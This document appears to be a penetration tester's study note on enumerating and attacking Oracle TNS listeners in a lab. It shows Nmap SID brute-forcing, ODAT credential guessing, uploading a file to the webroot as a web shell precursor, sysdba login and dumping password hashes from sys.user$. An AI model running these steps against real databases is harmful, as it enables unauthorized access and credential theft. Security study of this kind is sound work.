---
id: Enumeration
aliases: []
tags: []
---

# Enumeration

<!-- Nmap {{{-->
## Nmap

Scan the default Oracle [[General#TNS Listener|TNS Listener]] port

```sh
sudo nmap -p1521 -sV <target_ip> --open
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo nmap -p1521 -sV 10.129.204.235 --open
> ```
> ```sh
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
> Nmap scan report for 10.129.204.235
> Host is up (0.0041s latency).
>
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
> ```
<!-- }}} -->

### SID Bruteforcing

[[General#System Identifier|System Identifier]]s can be enumerated via various
tools (e.g., `nmap`, `hydra`, `odat`)

```sh
sudo nmap -p1521 -sV <target_ip> --open --script oracle-sid-brute
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
> ```
> ```sh
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
> Nmap scan report for 10.129.204.235
> Host is up (0.0044s latency).
>
> PORT     STATE SERVICE    VERSION
> 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
> | oracle-sid-brute: 
> |_  XE
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
> ```
<!-- }}} -->

<!-- }}} -->

<!-- ODAT {{{-->
## ODAT

[ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
is designed to enumerate and exploit security flaws
(e.g., *SQL injection*, *remote code execution*, *privilege escalation*)
in Oracle databases

### Install

Install [odat](https://www.kali.org/tools/odat/) with
[apt](https://en.wikipedia.org/wiki/APT_(software))

```sh
sudo apt install odat
```

Install [[Enumeration#ODAT|ODAT]] manually

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
> sudo mkdir -p /opt/oracle
> sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
> export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
> export PATH=$LD_LIBRARY_PATH:$PATH
> source ~/.bashrc
> cd ~
> git clone https://github.com/quentinhardy/odat.git
> cd odat/
> pip install python-libnmap
> git submodule init
> git submodule update
> pip3 install cx_Oracle
> sudo apt-get install python3-scapy -y
> sudo pip3 install colorlog termcolor passlib python-libnmap
> sudo apt-get install build-essential libgmp-dev -y
> pip3 install pycryptodome
>
> --2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
> Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
> Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
> HTTP request sent, awaiting response... 200 OK
> Length: 79386308 (76M) [application/zip]
> Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’
>
> <SNIP>
> ```
<!-- }}} -->

<!-- Enumeration {{{-->
### Enumeration

[[Enumeration#ODAT|ODAT]] can retrieve database names, versions, user accounts,
vulnerabilities, misconfigurations

```sh
./odat.py all -s <target_ip>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ./odat.py all -s 10.129.204.235
> ```
>
> The scan has found valid credentials :`scott`/`tiger`
>
> ```sh
> [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
> [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
>
> ...SNIP...
>
> [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
> [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
> [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
> [+] Valid credentials found: scott/tiger. Continue...
>
> ...SNIP...
> ```
<!-- }}} -->

<!-- }}} -->

<!-- File Upload {{{-->
### File Upload

It may be possible to upload a web shell to the target if

- the server is running a web server
- the server's [[Webapp/General/Web Server Root#Default|root directory location]]
  is known

1. Create a payload

```sh
echo "Oracle File Upload Test" > testing.txt
```

2. Upload the file to the database

```sh
./odat.py utlfile -s <target_ip> -d XE -U <use> -P <password> --sysdba --putFile C:\\path\\to <file.ext> ./testing.txt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
> ```
>
> > [!info]-
> >
> > - `utlfile`: [Oracle UTL_FILE](https://docs.oracle.com/database/121/ARPLS/u_file.htm)
> >   functionality to upload a file
> > - `-s 10.129.204.235`: target IP of the Oracle instance.
> > - `-d XE`: database/SID (Oracle XE).
> > - `-U scott`: username
> > - `-P tiger`: password in cleartext
> > - `--sysdba`: run with SYSDBA privileges
> > - `--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`:
> >   upload a file to the DB server's filesystem
> >
>
> ```sh
> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
> ```
<!-- }}} -->

3. Test if the uppload worked with [cURL](https://curl.se/)

```sh
curl -X GET http://10.129.204.235/testing.txt
```
```sh
Oracle File Upload Test
```

<!-- }}} -->

<!-- }}} -->

<!-- SQL Plus {{{-->
## SQL Plus

[SQL Plus](https://en.wikipedia.org/wiki/SQL_Plus) is an
[Oracle Database Utility](https://docs.oracle.com/cd/B14117_01/server.101/b12170/qstart.htm)
CLI, commonly used by users, administrators and programmers

<!-- Tip {{{-->
> [!tip]
>
> List of SQL Plus
> [commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
>
<!-- }}} -->

<!-- Log In {{{-->
### Log In

Log in as regular user

```sh
sqlplus <username>/<password>@<target_ip>/XE
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sqlplus scott/tiger@10.129.204.235/XE
> ```
> ```sh
> SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
> Version 21.4.0.0.0
>
> Copyright (c) 1982, 2021, Oracle. All rights reserved.
>
> ERROR:
> ORA-28002: the password will expire within 7 days
>
>
>
> Connected to:
> Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
>
> SQL>
> ```
<!-- }}} -->

Log in the regular user as `sysdba` (System Database Admin)

```sh
sqlplus <user>/<password>@<target_ip>/XE as sysdba
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sqlplus scott/tiger@10.129.204.235/XE as sysdba
> ```
> ```sh
> SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
> Version 21.4.0.0.0
>
> Copyright (c) 1982, 2021, Oracle. All rights reserved.
>
>
> Connected to:
> Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
>
> ```
> ```sh
> SQL> select * from user_role_privs;
> ```
> ```sh
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
> SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
> SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
> SYS                            AQ_USER_ROLE                   YES YES NO
> SYS                            AUTHENTICATEDUSER              YES YES NO
> SYS                            CONNECT                        YES YES NO
> SYS                            CTXAPP                         YES YES NO
> SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
> SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
> SYS                            DBA                            YES YES NO
> SYS                            DBFS_ROLE                      YES YES NO
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SYS                            DELETE_CATALOG_ROLE            YES YES NO
> SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
> ...SNIP...
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> In case of this error, execute the following
> (*taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)*)
>
> ```
> sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
> ```
> ```sh
> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Interaction {{{-->
### Interaction

List all available tables in the
[[General#Oracle RDBMS|Oracle RDBMS]]

```sql
select table_name from all_tables;
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> SQL> select table_name from all_tables;
> ```
> ```
> TABLE_NAME
> ------------------------------
> DUAL
> SYSTEM_PRIVILEGE_MAP
> TABLE_PRIVILEGE_MAP
> STMT_AUDIT_OPTION_MAP
> AUDIT_ACTIONS
> WRR$_REPLAY_CALL_FILTER
> HS_BULKLOAD_VIEW_OBJ
> HS$_PARALLEL_METADATA
> HS_PARTITION_COL_NAME
> HS_PARTITION_COL_TYPE
> HELP
>
> ...SNIP...
>
> ```
<!-- }}} -->

Show current user privileges

```sh
select * from user_role_privs;
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SQL> select * from user_role_privs;
> ```
> ```sh
>
> USERNAME                       GRANTED_ROLE                   ADM DEF OS_
> ------------------------------ ------------------------------ --- --- ---
> SCOTT                          CONNECT                        NO  YES NO
> SCOTT                          RESOURCE                       NO  YES NO
> ```
>
> - `scott` has no administrator privileges
<!-- }}} -->

<!-- }}} -->

<!-- Extract Password Hashes {{{-->
### Extract Password Hashes

Retrieve the password hashes of the `sys.user$`
[SYS.USER$](https://docs.oracle.com/database/121/ADMQS/GUID-CF1CD853-AF15-41EC-BC80-61918C73FDB5.htm#ADMQS12003)
(the default administrative user account) and try to crack them offline

```sql
select name, password from sys.user$;
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> select name, password from sys.user$;
> ```
> ```sh
> NAME                           PASSWORD
> ------------------------------ ------------------------------
> SYS                            FBA343E7D6C8BC9D
> PUBLIC
> CONNECT
> RESOURCE
> DBA
> SYSTEM                         B5073FE1DE351687
> SELECT_CATALOG_ROLE
> EXECUTE_CATALOG_ROLE
> DELETE_CATALOG_ROLE
> OUTLN                          4A3BA55E08595C81
> EXP_FULL_DATABASE
> 
> NAME                           PASSWORD
> ------------------------------ ------------------------------
> IMP_FULL_DATABASE
> LOGSTDBY_ADMINISTRATOR
> ...SNIP...
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Finger {{{-->
## Finger

If the [finger service](https://en.wikipedia.org/wiki/Finger_(protocol))
is active on the same host as the [[General#TNS Listener|TNS listener]],
and the Oracle OS account (often just `oracle`) is known,
the **finger** output can leak:

- The exact home directory (e.g., `/home/oracle`, `/u01/app/oracle`, etc.)
- The shell and sometimes system info
- Possibly hints about the Oracle software path or environment variables

This is valuable reconnaissance material:

- The home directory path often matches Oracle installation paths
- Knowing where Oracle is installed helps craft local privilege escalation,
  file system attacks, or configuration abuse
- Combined with other leaks (e.g.,
  [[General#Default Password|default listener password]] or unprotected
  `listener.ora`), an attacker could manipulate the TNS listener
  [[General#TNS Listener|TNS listener]] or connect directly to the database


```sh
finger oracle@<target_ip>
```

<!-- Exmaple {{{-->
> [!example]-
>
> Simple (Unix)
>
> ```sh
> finger oracle@10.129.204.235
> ```
>
> Raw TCP (works when **finger** client is missing)
>
> ```sh
> printf "oracle\r\n" | nc 10.129.204.235 79
> ```
>
> ```sh
> echo "oracle" | nc 10.129.204.235 79
> ```
>
> Telnet interactive
>
> ```sh
> telnet 10.129.204.235 79
> # then type: oracle<Enter>
> ```
<!-- }}} -->

<!-- }}} -->
